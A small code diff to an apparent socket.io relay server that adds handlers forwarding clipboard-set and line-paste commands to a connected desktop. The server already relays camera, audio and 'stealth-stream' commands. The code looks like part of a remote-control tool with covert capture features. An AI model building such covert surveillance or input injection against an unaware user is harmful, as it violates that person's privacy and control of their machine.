@@ -171,6 +171,9 @@ io.on('connection', (socket) => {
   socket.on('command:camera-stop',(data) => relayToDesktop(socket, 'command:camera-stop', data));
   socket.on('command:audio-start',(data) => relayToDesktop(socket, 'command:audio-start', data));
   socket.on('command:audio-stop', (data) => relayToDesktop(socket, 'command:audio-stop', data));
+  socket.on('command:clipboard-set',     (data) => relayToDesktop(socket, 'command:clipboard-set', data));
+  socket.on('command:pasteline',         (data) => relayToDesktop(socket, 'command:pasteline', data));
+  socket.on('command:pasteline-noeol',   (data) => relayToDesktop(socket, 'command:pasteline-noeol', data));
   socket.on('command:stealth-stream-start', (data) => relayToDesktop(socket, 'command:stealth-stream-start', data));
   socket.on('command:stealth-stream-stop',  (data) => relayToDesktop(socket, 'command:stealth-stream-stop', data));
 
